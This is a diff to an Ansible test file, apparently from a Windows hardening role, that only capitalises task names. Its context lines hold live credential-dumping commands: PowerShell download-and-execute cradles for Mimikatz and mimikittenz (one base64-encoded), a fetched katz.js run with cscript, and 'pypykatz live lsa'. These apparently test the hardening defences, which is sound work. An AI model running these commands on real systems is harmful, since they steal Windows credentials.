@@ -3,7 +3,7 @@
 # http://carnal0wnage.attackresearch.com/2013/10/dumping-domains-worth-of-passwords-with.html
 # https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
 # https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/, Jan 2017
-- name: testing | call mimikatz in different ways...
+- name: Testing | call mimikatz in different ways...
   win_shell: "{{ item }}"
   with_items:
     - IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds
@@ -14,7 +14,7 @@
     - IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1'); Invoke-mimikittenz
   failed_when: false
 
-- name: testing | call mimikatz in different ways - 2
+- name: Testing | call mimikatz in different ways - 2
   win_command: "{{ item }}"
   with_items:
     # encoded-mimikatz
@@ -23,7 +23,7 @@
     - powershell -enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcHV0dGVycGFuZGEvbWltaWtpdHRlbnovbWFzdGVyL0ludm9rZS1taW1pa2l0dGVuei5wczEnKTsgSW52b2tlLW1pbWlraXR0ZW56Cg==
   failed_when: false
 
-- name: testing | download mimikatz in javascript
+- name: Testing | download mimikatz in javascript
   win_get_url:
     url: https://gist.githubusercontent.com/500646/14051b27b45dce37818aca915e93062f/raw/2adcc9d2570b4367c6cc405e5a5969863d04fc9b/katz.js
     dest: "{{ harden_win_temp_dir }}\\katz.js"
@@ -31,7 +31,7 @@
   register: katzdl
   until: katzdl is success
 
-- name: testing | call mimikatz in javascript
+- name: Testing | call mimikatz in javascript
   win_command: "cscript.exe {{ harden_win_temp_dir }}\\katz.js"
   failed_when: false
   when: katzdl is succeeded
@@ -49,7 +49,7 @@
     ansible_user == 'winrm_test_user'
 
 # https://github.com/skelsec/pypykatz
-- name: testing | Ensure python is present
+- name: Testing | Ensure python is present
   win_chocolatey:
     name: python
     state: present
@@ -59,12 +59,12 @@
   become_method: runas
 
 # pip module under windows?
-- name: testing | install pypykatz
+- name: Testing | install pypykatz
   ansible.builtin.pip:
     name: pypykatz
     state: present
   failed_when: false
 
-- name: testing | run pypykatz
+- name: Testing | run pypykatz
   ansible.builtin.command: "pypykatz live lsa"  # noqa no-changed-when
   failed_when: false
